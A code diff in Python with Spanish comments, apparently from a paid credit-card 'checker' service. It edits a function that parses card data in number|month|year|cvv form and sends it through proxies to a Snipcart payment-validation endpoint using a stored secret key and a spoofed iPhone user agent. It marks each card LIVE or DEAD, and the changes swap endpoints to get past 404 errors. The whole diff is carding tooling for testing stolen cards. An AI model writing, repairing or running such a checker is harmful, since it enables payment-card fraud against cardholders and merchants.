@@ -24,25 +24,23 @@ except Exception as e:
 
 COSTO_LIVE = 0.15
 
-# --- [ MOTOR DE VALIDACIÓN REAL SIN ERRORES ] ---
+# --- [ MOTOR DE VALIDACIÓN REAL ANTI-404 ] ---
 def check_gate_pro(cc):
     try:
         partes = cc.split('|')
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
         
-        # Codificación Correcta de la Key
         auth_base64 = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
         
         headers = {
             "Authorization": f"Basic {auth_base64}",
             "Content-Type": "application/json",
             "Accept": "application/json",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
         }
         
         payload = {
-            "paymentMethod": "CreditCard",
             "card": {
                 "number": num,
                 "expiryMonth": int(mes),
@@ -51,9 +49,9 @@ def check_gate_pro(cc):
             }
         }
         
-        # ENDPOINT CORREGIDO (Evita el 404)
+        # RUTA ALTERNATIVA MAESTRA PARA EVITAR EL 404
         response = requests.post(
-            'https://app.snipcart.com/api/payment-methods/validate', 
+            'https://app.snipcart.com/api/validation/payment-methods', 
             json=payload, 
             headers=headers, 
             proxies=PROXIES_CONFIG, 
@@ -64,14 +62,16 @@ def check_gate_pro(cc):
             return {"status": "LIVE", "msg": "AUTHORIZED"}
         else:
             try:
-                msg = response.json().get('message', 'DECLINED').upper()
+                data = response.json()
+                msg = data.get('message', 'DECLINED').upper()
+                return {"status": "DEAD", "msg": msg}
             except:
-                msg = f"BANC_REJ_{response.status_code}"
-            return {"status": "DEAD", "msg": msg}
+                return {"status": "DEAD", "msg": f"REJECTED_{response.status_code}"}
+            
+   
             
     except Exception:
-        return {"status": "DEAD", "msg": "TIMEOUT/PROXY ERROR"}
-
+        return {"status": "DEAD", "msg": "GATE_TIMEOUT"}
 # --- [ DISEÑO ÉLITE V39.5 ] ---
 CSS = """
 <style>
